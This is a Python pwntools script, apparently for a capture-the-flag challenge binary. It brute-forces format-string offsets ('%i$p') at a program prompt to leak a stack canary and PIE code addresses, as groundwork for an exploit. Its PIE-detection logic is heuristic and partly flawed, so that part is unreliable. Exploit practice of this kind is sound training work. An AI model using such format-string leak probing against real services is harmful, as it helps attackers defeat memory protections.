from pwn import *

# Thay đổi binary name
BINARY = './super_jumpio_kart'
context.binary = BINARY

def find_offsets():
    for i in range(1, 100): # Thử 100 offset đầu tiên
        try:
            p = process(BINARY)
            
            # Chọn custom()
            p.sendlineafter(b'> ', b'4')
            
            # Gửi payload format string để thử offset i
            payload = f'%{i}$p'.encode()
            p.sendlineafter(b'Power Up: ', payload)
            
            p.recvuntil(b'You start the race with: ')
            leaked_data = p.recvline().strip()
            
            # Bỏ qua nếu không leak ra gì hoặc leak ra '(nil)'
            if b'(nil)' in leaked_data or len(leaked_data) < 4:
                p.close()
                continue

            # Kiểm tra xem có phải Canary không
            # Chuyển thành số, sau đó kiểm tra byte cuối cùng
            value = int(leaked_data, 16)
            if (value & 0xff) == 0x00 and value > 0x100000000000:
                print(f"[*] Found possible Canary at offset: {i}")

            # Kiểm tra xem có phải PIE leak không (địa chỉ code)
            # Giả sử địa chỉ bắt đầu của code là 0x1000
            # Đây là một phỏng đoán, nhưng thường đúng
            if (value & 0xfff) > 0x000:
                 # ELF header của binary
                elf = ELF(BINARY)
                # Ghidra thường load chương trình ở 0x100000
                # pwntools thường load ở 0x400000, context.binary sẽ xử lý
                # Chúng ta kiểm tra xem địa chỉ leak có nằm trong vùng code không
                if value > elf.address and value < (elf.address + elf.bss()):
                    print(f"[*] Found possible PIE leak at offset: {i}")

            p.close()
        except Exception as e:
            # print(f"Error at offset {i}: {e}")
            p.close()

if __name__ == '__main__':
    find_offsets()